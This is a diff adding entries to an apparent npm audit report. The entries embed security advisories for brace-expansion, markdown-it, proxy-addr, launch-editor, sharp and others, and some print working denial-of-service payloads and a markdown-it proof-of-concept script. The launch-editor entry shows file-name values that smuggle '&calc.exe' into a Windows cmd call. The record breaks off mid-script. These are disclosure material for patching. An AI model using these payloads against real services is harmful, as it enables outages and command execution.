+      "title": "brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102277"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.12",
+      "github_advisory_id": "GHSA-q2hr-2g5m-vwhr",
+      "recommendation": "Upgrade to version 5.0.12 or later",
+      "patched_versions": ">=5.0.12",
+      "updated": "2026-09-29T23:45:39.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-q2hr-2g5m-vwhr"
+    },
+    "1240107": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            "lib__api-spec>orval>typedoc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-qhr7-859c-m2p7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102278\n- https://github.com/juliangruber/brace-expansion/commit/1efee7c397c191da6287a78ec19512476a966a7b\n- https://github.com/juliangruber/brace-expansion/commit/935d78f32f335b2ff76578e5c5e877d31ae9888c\n- https://github.com/juliangruber/brace-expansion/commit/de84f144e9816f30e25fc8179e2e1249ab6df0db\n- https://github.com/advisories/GHSA-qhr7-859c-m2p7",
+      "created": "2026-09-29T23:45:17.000Z",
+      "id": 1240107,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.\n\nThis is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.\n\nIt is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.\n\n### Two recursion sites\n\n**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:\n\n```js\nexpand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,907 - about **15.6 KB** of input.\n\n**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:\n\n```js\nexpand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.\n\nAvailability only. No code execution, no data exposure.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.\n\n### Patch\n\nA `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.\n\nThe default sits far above any realistic nesting depth and well below the crash threshold.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion on nested brace groups causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102278"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.11",
+      "github_advisory_id": "GHSA-qhr7-859c-m2p7",
+      "recommendation": "Upgrade to version 5.0.11 or later",
+      "patched_versions": ">=5.0.11",
+      "updated": "2026-09-29T23:45:19.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-qhr7-859c-m2p7"
+    },
+    "1240111": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            "lib__api-spec>orval>typedoc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-6j4f-fj2g-mc7p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102276\n- https://github.com/juliangruber/brace-expansion/commit/0bcbfc0a5928c3073d48f42999d1ce4fc1c42fbc\n- https://github.com/juliangruber/brace-expansion/commit/316359e6019c39b3254c8ba8e25dc586a480652c\n- https://github.com/juliangruber/brace-expansion/commit/5171e681c0922b7ae8bfaf9a331e309107be6edc\n- https://github.com/juliangruber/brace-expansion/commit/6735c94873ca570bcdd6a0690033bdd3126379d3\n- https://github.com/advisories/GHSA-6j4f-fj2g-mc7p",
+      "created": "2026-09-29T23:44:58.000Z",
+      "id": 1240111,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.\n\nThis is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.\n\n### Vector 1 - unbounded recursion on `post`\n\n`parseCommaParts()` recursed on the remainder of the string once per brace group:\n\n```js\nconst postParts = parseCommaParts(post)   // unbounded\n```\n\nA brace group containing many comma-separated groups drives one recursion level per group:\n\n```js\nexpand('{' + '{a},'.repeat(7000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nAbout 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.\n\n### Vector 2 - `push.apply` with an unbounded array\n\nEven with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:\n\n```js\np.push.apply(p, postParts)\nparts.push.apply(parts, p)\n```\n\n`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:\n\n```js\nexpand('{{x},' + 'a,'.repeat(125000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nThreshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.\n\n`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.\n\nThis is an availability-only issue. No code execution and no data exposure.\n\n### Not a regression\n\n5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.\n\n### Patch\n\n`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.\n\nEquivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.\n\n### Severity note\n\nScored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).\n\n### Credit\n\nReported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion in parseCommaParts causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102276"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=4.0.0 <5.0.10",
+      "github_advisory_id": "GHSA-6j4f-fj2g-mc7p",
+      "recommendation": "Upgrade to version 5.0.10 or later",
+      "patched_versions": ">=5.0.10",
+      "updated": "2026-09-29T23:44:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-6j4f-fj2g-mc7p"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "artifacts__dashboard-ui>@tailwindcss/vite>@tailwindcss/node>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241210": {
+      "findings": [
+        {
+          "version": "2.0.7",
+          "paths": [
+            "artifacts__api-server>express>proxy-addr"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/proxy-addr/security/advisories/GHSA-jqcg-44mw-7w3h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-90711\n- https://github.com/jshttp/proxy-addr/commit/780911d84d18e2c5fa008ed0c0d387631ec11965\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/jshttp/proxy-addr/releases/tag/v2.0.8\n- https://github.com/advisories/GHSA-jqcg-44mw-7w3h",
+      "created": "2026-10-05T23:30:26.000Z",
+      "id": 1241210,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`proxy-addr` determines which network hops are trusted proxies so that `X-Forwarded-For` can be believed. When an application configures a trust subnet as an IPv4-mapped IPv6 address with a short prefix, such as `::ffff:10.0.0.0/8` (the correct spelling is `::ffff:10.0.0.0/104`), the subnet compiles with all-zero leading bits and matches every IPv4 address instead of the block it names. The same happens for any IPv6 trust subnet with zero leading bits, such as `::/1`.\n\nEvery unauthenticated client is then trusted as a proxy at hop 0, so `proxyaddr(req, trust)`, and therefore `req.ip` and `req.ips` in Express, returns whatever the client sends in `X-Forwarded-For`. This defeats IP-based access control, rate limiting, geolocation, and audit logging. The misconfiguration compiles without any error, and the same block written correctly behaves correctly, so the difference is not visible from the configuration.\n\n### Patches\n\nUpgrade to `proxy-addr` 2.0.8. An IPv4 address now matches an IPv6 trust subnet only when that subnet is a genuine IPv4-mapped subnet whose prefix covers the mapped marker.\n\n### Workarounds\n\nWrite IPv4 trust subnets in plain IPv4 notation (for example `10.0.0.0/8`). If IPv4-mapped IPv6 notation is required, use the full form so the prefix covers the mapped marker (for example `::ffff:10.0.0.0/104` for the `10.0.0.0/8` block).",
+      "reported_by": null,
+      "title": "proxy-addr vulnerable to IP spoofing via IPv4-mapped IPv6 trust subnet",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-90711"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "proxy-addr",
+      "vulnerable_versions": ">=1.1.0 <2.0.8",
+      "github_advisory_id": "GHSA-jqcg-44mw-7w3h",
+      "recommendation": "Upgrade to version 2.0.8 or later",
+      "patched_versions": ">=2.0.8",
+      "updated": "2026-10-05T23:30:27.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-290",
+        "CWE-348",
+        "CWE-697"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqcg-44mw-7w3h"
+    },
+    "1241257": {
+      "findings": [
+        {
+          "version": "4.0.2",
+          "paths": [
+            "artifacts__api-server>pino-pretty>fast-copy"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/planttheidea/fast-copy/security/advisories/GHSA-jggr-w7fw-pc2j\n- https://github.com/planttheidea/fast-copy/pull/137\n- https://github.com/planttheidea/fast-copy/pull/138\n- https://github.com/planttheidea/fast-copy/pull/139\n- https://github.com/planttheidea/fast-copy/commit/359c00884ae8ae31f10925fd0e2fc66661db6cef\n- https://github.com/planttheidea/fast-copy/commit/caa7caace65767dfe252f0dc5115d82c99ca16b9\n- https://github.com/planttheidea/fast-copy/commit/dedf465e5329fbd149f13b53521af962d16ff8df\n- https://github.com/planttheidea/fast-copy/releases/tag/v2.2.0\n- https://github.com/planttheidea/fast-copy/releases/tag/v3.1.0\n- https://github.com/planttheidea/fast-copy/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-jggr-w7fw-pc2j",
+      "created": "2026-10-05T22:52:09.000Z",
+      "id": 1241257,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`fast-copy` traverses values recursively with no bound on depth. Copying a sufficiently deeply-nested value exhausts the JavaScript call stack and throws a native `RangeError: Maximum call stack size exceeded` from inside the library.\n\n## Details\n\nBoth `copy` and `copyStrict` recurse once per level of nesting. The value does not need to be circular (circular references were already handled correctly via an internal cache) and it does not need to be large. A plain object nested a few thousand levels deep is only a few\nkilobytes of equivalent JSON.\n\nMeasured depths at which copying begins to fail (Node.js, V8; the exact ceiling varies with JIT state and the stack available to the environment):\n\n| Call                 | Last depth that copies successfully |\n| -------------------- | ----------------------------------- |\n| `copy(object)`       | 2811                                |\n| `copy(array)`        | 3983                                |\n| `copyStrict(object)` | 1874                                |\n| `copyStrict(array)`  | 1874                                |\n\n`JSON.parse` is iterative and parses deeply-nested input without difficulty, so a payload that deserializes cleanly can fail in a subsequent `copy` call.\n\n## Impact\n\nThe failure is a synchronous, catchable `RangeError` confined to the `copy` call that received the value. There are no memory safety concerns, no data exposure, and no effect on state outside that call. In a typical server the result is a failed request rather than a failed process.\n\nApplications that call `copy` on externally-supplied data, such as request bodies, cached payloads, merged configuration, etc., do not expect a clone helper to throw may surface this as an unhandled error.\n\n## Patches\n\nFixed in 4.1.0, and backported to 3.1.0 and 2.2.0 so that every major line has a patch available without requiring a breaking upgrade.\n\nTraversal is now bounded by a `maxDepth` option, defaulting to `1000`, which sits below the native limit in standard environments. Exceeding it throws `MaxDepthExceededError`, which carries the limit that was exceeded and extends `RangeError` so existing handling continues to match.\n\nThe limit is configurable for consumers with legitimately deep data. On `3.x` and `4.x` it is set when creating a copier:\n\n```js\nimport { createCopier } from 'fast-copy';\n\nexport const copy = createCopier({ maxDepth: 5000 });\n```\n\nOn `2.x` it is passed per call, and the error is a property of the exported function rather than a named export:\n\n```js\nimport copy from 'fast-copy';\n\ncopy(value, { maxDepth: 5000 });\n// detection: error instanceof copy.MaxDepthExceededError\n```\n\nIn legacy environments without `Object.setPrototypeOf`, `instanceof MaxDepthExceededError` cannot be supported; check `error.name === 'MaxDepthExceededError'` or `error instanceof RangeError` instead.",
+      "reported_by": null,
+      "title": "fast-copy: Stack exhaustion in fast-copy when copying deeply-nested values",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-copy",
+      "vulnerable_versions": ">=4.0.0 <4.1.0",
+      "github_advisory_id": "GHSA-jggr-w7fw-pc2j",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-10-05T22:52:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-jggr-w7fw-pc2j"
+    },
+    "1241331": {
+      "findings": [
+        {
+          "version": "0.35.4",
+          "paths": [
+            "artifacts__api-server>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w\n- https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236\n- https://github.com/lovell/sharp/releases/tag/v0.35.5\n- https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241\n- https://www.cve.org/CVERecord?id=CVE-2026-96889\n- https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+      "created": "2026-10-06T13:43:57.000Z",
+      "id": 1241331,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+      "reported_by": null,
+      "title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.5",
+      "github_advisory_id": "GHSA-wq5f-xc86-pv6w",
+      "recommendation": "Upgrade to version 0.35.5 or later",
+      "patched_versions": ">=0.35.5",
+      "updated": "2026-10-06T13:43:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-416",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w"
+    },
+    "1242600": {
+      "findings": [
+        {
+          "version": "14.3.1",
+          "paths": [
+            "lib__api-spec>orval>typedoc>markdown-it"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/markdown-it/markdown-it/security/advisories/GHSA-r7fv-28h4-cvq7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111759\n- https://github.com/markdown-it/markdown-it/commit/1b379c1b6d0522421bd1a51b77337c79af2c8670\n- https://github.com/markdown-it/markdown-it/commit/cf27366035edf9196667110c47d9d67b030a4152\n- https://github.com/markdown-it/markdown-it/commit/daf5a3c32303e5d9de01b12eeb725fb5990b8162\n- https://github.com/markdown-it/markdown-it/releases/tag/14.3.2\n- https://github.com/markdown-it/markdown-it/releases/tag/15.0.2\n- https://github.com/advisories/GHSA-r7fv-28h4-cvq7",
+      "created": "2026-10-20T14:34:50.000Z",
+      "id": 1242600,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `typographer: true` is enabled, specially crafted Markdown can cause quadratic processing time in the smartquotes rule, potentially leading to denial of service in applications processing untrusted input.\n\nMany opening double quotes followed by unmatched closing single quotes cause repeated scans of the entire opener stack. The same issue occurs with the quote types reversed.\n\nThe default configuration (`typographer: false`) is not affected, but this option is enabled with high probability.\n\n### Reproduction\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst md = new MarkdownIt({ typographer: true })\n\nfor (const k of [2000, 4000, 8000, 16000, 32000]) {\n  const input = '\"a '.repeat(k) + \"b' \".repeat(k)\n  const start = performance.now()\n  md.render(input)\n  console.log(input.length, (performance.now() - start).toFixed(1), 'ms')\n}\n```\n\nResult:\n\n|input size|time|\n|-|-|\n|12000|18ms|\n|24000|47ms|\n|48000|115ms|\n|96000|428ms|\n|192000|1586ms|\n\n### Patches\n\nFixed in **15.0.2** and **14.3.2**.\n\n### Workarounds\n\nDisable typography with `typographer: false`, or disable only the smartquotes rule:\n\n```js\nmd.disable('smartquotes')\n```",
+      "reported_by": null,
+      "title": "markdown-it: Quadratic complexity in smartquotes with unmatched closing quotes",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111759"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "markdown-it",
+      "vulnerable_versions": "<14.3.2",
+      "github_advisory_id": "GHSA-r7fv-28h4-cvq7",
+      "recommendation": "Upgrade to version 14.3.2 or later",
+      "patched_versions": ">=14.3.2",
+      "updated": "2026-10-20T14:34:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-r7fv-28h4-cvq7"
+    },
+    "1242623": {
+      "findings": [
+        {
+          "version": "7.3.6",
+          "paths": [
+            "artifacts__dashboard-ui>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112943\n- https://github.com/vitejs/launch-editor/pull/155\n- https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-698v-4r3x-3vcv",
+      "created": "2026-10-20T18:30:24.000Z",
+      "id": 1242623,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\n\n### Impact\n\nOnly apps that match all of the following conditions are affected:\n\n- The user uses Windows\n- An attacker can place a file with the malicious filename containing `&` or `%`\n- Either of\n  - An attacker can inject an environment variable with a malicious value\n  - An attacker can add a NTFS alternate data stream to the file placed\n\n### Details\n\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\n\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\n\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`",
+      "reported_by": null,
+      "title": "launch-editor: escapeCmdArgs() omits % escaping on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112943"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-698v-4r3x-3vcv",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T18:30:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-698v-4r3x-3vcv"
+    },
+    "1242646": {
+      "findings": [
+        {
+          "version": "14.3.1",
+          "paths": [
+            "lib__api-spec>orval>typedoc>markdown-it"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/markdown-it/markdown-it/security/advisories/GHSA-vfgh-jcmw-g37q\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111766\n- https://github.com/markdown-it/markdown-it/commit/928bc8c11ded60181c0e7fc5aa954eec582e8e79\n- https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503\n- https://github.com/markdown-it/markdown-it/releases/tag/14.3.3\n- https://github.com/markdown-it/markdown-it/releases/tag/15.0.3\n- https://github.com/advisories/GHSA-vfgh-jcmw-g37q",
+      "created": "2026-10-20T20:08:19.000Z",
+      "id": 1242646,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`<!--`), processing instructions (`<?`), declarations (`<!A`), and CDATA sections (`<![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `<` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `-->`, `?>`, `>`, and `]]>`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed <!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'</' + '<!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\nThe original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\n### Proof of concept\n\nInstall the affected package in an empty directory:\n\n```sh\nnpm install markdown-it@15.0.2\n```\n\nSave the following as `poc.mjs` and run `node poc.mjs`:\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst mdHtml = new MarkdownIt({ html: true })\nconst mdDefault = new MarkdownIt()\nconst sizes = [8000, 16000, 32000, 64000]\n\nfunction measure(md, src) {\n  const start = performance.now()\n  md.render(src)\n  return (performance.now() - start).toFixed(1)\n}\n\nconst variants = {\n  comment: '<!--',\n  processing: '<?x',\n  declaration: '<!A',\n  cdata: '<![CDATA['\n}\n\nfor (const [name, opener] of Object.entries(variants)) {\n  console.log(`\\n${name}`)\n  for (const n of sizes) {\n    const src = 'x ' + opener.repeat(n)\n    console.log({\n      n,\n      bytes: Buffer.byteLength(src),\n      ms: measure(mdHtml, src)\n    })\n  }\n}\n\nconst n = 